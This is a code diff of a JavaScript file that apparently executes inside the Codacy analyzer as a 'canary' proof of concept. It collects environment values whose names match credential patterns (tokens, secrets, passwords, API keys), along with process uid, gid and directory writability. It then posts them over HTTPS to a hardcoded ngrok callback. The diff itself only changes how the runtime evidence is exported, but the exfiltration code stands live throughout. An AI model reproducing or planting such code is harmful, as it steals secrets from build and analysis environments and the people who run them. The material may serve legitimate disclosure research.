@@ -8,6 +8,7 @@ const CALLBACK =
   "https://dcd6-49-207-201-243.ngrok-free.app/codacy/064a0614a716d033f1791a45";
 const CREDENTIAL_NAME =
   /(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)/i;
+let runtimeEvidence = "CODACY_CANARY_NOT_EXECUTED";
 
 function isWritable(path) {
   try {
@@ -45,7 +46,7 @@ if (!globalThis.__codacyAnalyzerCanarySent) {
     credentials,
   });
 
-  const runtimeEvidence = [
+  runtimeEvidence = [
     "CODACY_CANARY_EXECUTED",
     `uid=${runtime.uid}`,
     `gid=${runtime.gid}`,
@@ -54,12 +55,6 @@ if (!globalThis.__codacyAnalyzerCanarySent) {
     `workdir_writable=${runtime.workdirWritable}`,
     `credential_names=${Object.keys(credentials).sort().join(",")}`,
   ].join(" ");
-
-  try {
-    const { builtinRules } = require("eslint/use-at-your-own-risk");
-    const noConsoleRule = builtinRules.get("no-console");
-    noConsoleRule.meta.messages.unexpected = runtimeEvidence;
-  } catch {}
 
   const request = https.request(
     CALLBACK,
@@ -80,4 +75,4 @@ if (!globalThis.__codacyAnalyzerCanarySent) {
   request.end(payload);
 }
 
-module.exports = {};
+module.exports = { runtimeEvidence };
